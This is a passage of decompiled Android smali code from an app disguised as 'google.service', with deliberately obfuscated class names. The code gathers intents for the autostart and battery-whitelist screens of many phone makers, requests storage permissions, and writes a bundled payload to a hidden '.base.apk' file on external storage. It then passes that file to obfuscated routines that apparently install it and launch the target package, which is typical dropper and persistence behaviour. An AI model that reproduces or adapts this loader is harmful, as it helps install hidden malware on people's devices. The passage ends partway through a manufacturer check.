.class public Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;
.super Landroid/app/Activity;
.source "\u02c8\u02be\u2db1\u05d9\u03c6\u02c9\u02ce$\u1d62\u02bb\u03b8\u1d62\u02cb\u02ce\u3164\u02ce\u2db1\u3164\u03c6\u02bf\u02bf\u02be\u02c8\u02c6\u02c9\u02c6\u2db1\u4240\u1d35\ufe73\u02ca\uff9e\u05d94779.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;
    }
.end annotation


# static fields
.field public static Holdit:Ljava/lang/Boolean; = null

.field public static IamDone:Z = false

.field private static final POWERMANAGER_INTENTS:[Landroid/content/Intent;

.field public static TP:Ljava/lang/String; = "null"

.field public static display_height:Ljava/lang/String; = "display_height"

.field public static display_width:Ljava/lang/String; = "display_width"


# instance fields
.field PERMISSION_ALL:I

.field StoragPermissions:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 8

    const/4 v0, 0x0

    .line 152
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->Holdit:Ljava/lang/Boolean;

    const/16 v1, 0x11

    new-array v1, v1, [Landroid/content/Intent;

    .line 248
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.miui.securitycenter"

    const-string v5, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 249
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    aput-object v2, v1, v0

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.letv.android.letvsafe"

    const-string v5, "com.letv.android.letvsafe.AutobootManageActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 250
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x1

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.huawei.systemmanager"

    const-string v5, "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 251
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x2

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v6, "com.huawei.systemmanager.optimize.process.ProtectActivity"

    invoke-direct {v3, v4, v6}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 252
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x3

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v6, "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"

    invoke-direct {v3, v4, v6}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 253
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x4

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v6, "com.coloros.safecenter"

    const-string v7, "com.coloros.safecenter.permission.startup.StartupAppListActivity"

    invoke-direct {v3, v6, v7}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 254
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x5

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v7, "com.coloros.safecenter.startupapp.StartupAppListActivity"

    invoke-direct {v3, v6, v7}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 255
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x6

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v6, "com.oppo.safe"

    const-string v7, "com.oppo.safe.permission.startup.StartupAppListActivity"

    invoke-direct {v3, v6, v7}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 256
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x7

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v6, "com.iqoo.secure"

    const-string v7, "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"

    invoke-direct {v3, v6, v7}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 257
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0x8

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 258
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0x9

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"

    invoke-direct {v3, v6, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 259
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0xa

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.vivo.permissionmanager"

    const-string v5, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 260
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0xb

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.samsung.android.lool"

    const-string v5, "com.samsung.android.sm.battery.ui.BatteryActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 261
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0xc

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v5, "com.samsung.android.sm.ui.battery.BatteryActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 262
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0xd

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.htc.pitroad"

    const-string v5, "com.htc.pitroad.landingpage.activity.LandingPageActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 263
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0xe

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.asus.mobilemanager"

    const-string v5, "com.asus.mobilemanager.MainActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 264
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0xf

    aput-object v2, v1, v3

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.transsion.phonemanager"

    const-string v5, "com.itel.autobootmanager.activity.AutoBootMgrActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 265
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v2

    const/16 v3, 0x10

    aput-object v2, v1, v3

    sput-object v1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->POWERMANAGER_INTENTS:[Landroid/content/Intent;

    .line 605
    sput-boolean v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->IamDone:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 47
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0x22b

    .line 277
    iput v0, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->PERMISSION_ALL:I

    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"

    .line 278
    filled-new-array {v0, v1}, [Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->StoragPermissions:[Ljava/lang/String;

    return-void
.end method

.method public static varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 459
    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 460
    invoke-static {p0, v3}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method

.method public static isPackageInstalled(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z
    .locals 1

    const/4 v0, 0x0

    .line 54
    :try_start_0
    invoke-virtual {p1, p0, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p0, 0x1

    return p0

    :catch_0
    return v0
.end method


# virtual methods
.method public CheckBind()V
    .locals 14

    .line 377
    :try_start_0
    sget-object v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->pr:Ljava/lang/String;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    sget-char v1, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->c1:C
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const-string v2, "null"

    const-string v3, "LOCAL"

    const-string v4, "SDCARD"

    const/4 v5, 0x0

    if-ne v0, v1, :cond_6

    :try_start_1
    sget-object v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    sget-object v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-static {v0, v1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->isPackageInstalled(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v0

    if-nez v0, :cond_6

    const/4 v0, 0x1

    .line 378
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->Holdit:Ljava/lang/Boolean;

    .line 381
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 382
    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    .line 383
    invoke-static {v0, v1}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->gt(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "apk"

    .line 385
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v6}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    const/high16 v7, 0x7f080000

    invoke-virtual {v6, v7}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v6

    .line 386
    invoke-virtual {v6}, Ljava/io/InputStream;->available()I

    move-result v7

    if-eqz v7, :cond_5

    int-to-long v7, v7

    const-wide/32 v9, 0xfa000

    const-wide/16 v11, 0x400

    cmp-long v13, v7, v9

    if-ltz v13, :cond_0

    const-wide/32 v11, 0x19000

    goto :goto_0

    :cond_0
    const-wide/32 v9, 0x7d000

    cmp-long v13, v7, v9

    if-ltz v13, :cond_1

    const-wide/32 v11, 0xc800

    goto :goto_0

    :cond_1
    const-wide/32 v9, 0x32000

    cmp-long v13, v7, v9

    if-ltz v13, :cond_2

    const-wide/16 v11, 0x5000

    goto :goto_0

    :cond_2
    cmp-long v9, v7, v11

    if-ltz v9, :cond_3

    goto :goto_0

    :cond_3
    const-wide/16 v11, 0x200

    .line 400
    :goto_0
    invoke-static {v11, v12}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v7

    .line 401
    invoke-virtual {v7}, Ljava/lang/Long;->intValue()I

    move-result v7

    .line 402
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "/.base."

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 403
    new-instance v9, Ljava/io/FileOutputStream;

    new-instance v10, Ljava/io/File;

    invoke-direct {v10, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v9, v10}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 404
    new-array v10, v7, [B
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    :goto_1
    const/4 v11, 0x0

    .line 407
    :try_start_2
    invoke-virtual {v6, v10, v11, v7}, Ljava/io/InputStream;->read([BII)I

    move-result v12

    const/4 v13, -0x1

    if-eq v12, v13, :cond_4

    .line 408
    invoke-virtual {v9, v10, v11, v12}, Ljava/io/OutputStream;->write([BII)V

    goto :goto_1

    .line 410
    :cond_4
    invoke-virtual {v6}, Ljava/io/InputStream;->close()V

    .line 411
    invoke-virtual {v9}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 413
    :try_start_3
    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    .line 414
    invoke-virtual {v6, v8, v11}, Landroid/content/pm/PackageManager;->getPackageArchiveInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v6

    .line 415
    iget-object v6, v6, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-static {v0, v6, v1}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->dit(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_2

    .line 417
    :catch_0
    :try_start_4
    invoke-static {v0, v1, v1}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->dit(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 421
    :goto_2
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v8, v2}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->nvfTkyvZhpmvFzetplXVaTcFmVGRMFG4812(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 427
    :catch_1
    :cond_5
    :try_start_5
    new-instance v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;

    invoke-direct {v0, p0, v5}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;-><init>(Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$1;)V

    .line 428
    filled-new-array {v4, v3}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_3

    .line 434
    :cond_6
    sget-object v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-static {v0, v1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->isPackageInstalled(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v0

    if-eqz v0, :cond_7

    sget-object v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 436
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 437
    sget-object v1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000000

    .line 438
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 439
    invoke-virtual {p0, v0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->startActivity(Landroid/content/Intent;)V

    .line 440
    new-instance v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;

    invoke-direct {v0, p0, v5}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;-><init>(Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$1;)V

    .line 441
    filled-new-array {v4, v3}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_3

    .line 445
    :cond_7
    new-instance v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;

    invoke-direct {v0, p0, v5}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;-><init>(Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$1;)V

    .line 446
    filled-new-array {v4, v3}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 447
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->finish()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :catch_2
    :goto_3
    return-void
.end method

.method public NeedStartApp()V
    .locals 7

    .line 184
    :try_start_0
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v1, "xiaomi"

    .line 185
    invoke-virtual {v1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-eqz v1, :cond_0

    :goto_0
    const/4 v0, 0x1

    goto :goto_1

    :cond_0
    const-string v1, "oppo"

    .line 189
    invoke-virtual {v1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    goto :goto_0

    :cond_1
    const-string v1, "vivo"

    .line 192
    invoke-virtual {v1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    goto :goto_0

    :cond_2
    const-string v1, "Letv"

    .line 195
    invoke-virtual {v1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_3

    goto :goto_0

    :cond_3
    const-string v1, "huawei"

    .line 198
    invoke-virtual {v1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

